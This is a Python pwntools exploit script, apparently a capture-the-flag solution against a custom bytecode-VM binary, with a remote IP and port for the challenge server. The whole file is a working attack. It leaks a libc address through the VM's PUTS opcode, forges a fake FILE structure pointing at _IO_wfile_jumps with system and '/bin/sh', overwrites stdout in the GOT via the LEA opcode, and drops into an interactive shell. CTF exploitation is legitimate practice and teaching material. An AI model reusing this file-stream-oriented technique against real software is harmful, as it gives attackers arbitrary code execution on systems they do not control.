#!/usr/bin/env python3

from pwn import *
from enum import Enum

class OpCodes(Enum):
	ADD = 0
	SUB = 1
	DIV = 2
	MUL = 3
	AND = 4			
	XOR = 5
	OR  = 6	
	PUSH= 7	
	POP = 8
	PRT = 9	
	PUTS= 10		
	DEC = 11
	INC = 12
	LEA = 13
	NOP = 14
	HALT= 15

elf = ELF("bytecode_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = elf
context.terminal = ['alacritty', '-e']

def conn():
    if args.REMOTE:
        r = remote("172.210.129.230", 1350)
    else:
        r = process([elf.path])
        if args.GDB:
            gdb.attach(r)

    return r

def compile(shellcode: str):
    instructions = shellcode.strip().split("\n")
    result = b""
    for instruction in instructions:
        instruction = instruction.strip()
        separator = instruction.find(" ")

        if separator != -1:
            parts = [instruction[:separator], instruction[separator+1:]]
        else:
            parts = [instruction]

        for opcode in OpCodes:
            if opcode.name in parts[0]:
                result += opcode.value.to_bytes(1, "little")

        if len(parts) != 2:
            continue # skip if we don't have args

        for arg in parts[1].split(","):
            arg = arg.strip()
            if "q" in arg:
                result += p64(int(arg[:-1], 16))
            elif "d" in arg:
                result += p32(int(arg[:-1], 16))
            elif "s" in arg:
                data = bytes.fromhex(arg[2:-1])
                n = len(data)%256
                result += n.to_bytes(1, "little")
                result += data
            else:
                error("Failed to compile bytecode")
                exit(-1)
    return result
     

def main():
    r = conn()

    bytecode = compile("""
    PUTS 0x404020d
    """)

    r.sendlineafter(b'>> ', bytecode)
    stdout = unpack(r.recvline().strip().ljust(8, b'\x00'))
    libc.address = stdout - libc.sym._IO_2_1_stdout_

    info("stdout@GLIBC : " + hex(stdout))
    info("libc base : " + hex(libc.address))

    info("Crafting File Struct to overwrite stdout")

    wide_data = elf.sym.stack  # we'll store the stream on the fake stack
    stream = elf.sym.stack + 0xe8

    fp = FileStructure()
    fp._lock = libc.sym.__free_hook # since hooks are deprecated this poitns to 0
    fp.flags = unpack(b" /bin/sh")
    fp._IO_read_ptr = 0
    fp.vtable = libc.sym._IO_wfile_jumps - 0x20
    fp._wide_data = wide_data

    wide_data_bytes = flat({
        0x68 : [ libc.sym.system ],
        0xe0 : [ wide_data ]
    }, filler=b'\x00')

    total_data = (wide_data_bytes + bytes(fp))[::-1] # we flip the data to insert on stack

    shellcode = ""
    for i in range(0, len(total_data), 8):
        block = total_data[i:i+8]
        shellcode += "PUSH 0x%xq\n" % unpack(block, endianness="big")

    shellcode += "LEA 0x404020q, 0x%xq\n" % stream # overwrite stdout on got with our stack
    shellcode += "PRT 0x41414141s"

    info("======== FINAL BYTECODE =========")
    info(shellcode)
    info("=================================")

    r.sendlineafter(b'>> ', compile(shellcode))

    r.interactive()


if __name__ == "__main__":
    main()
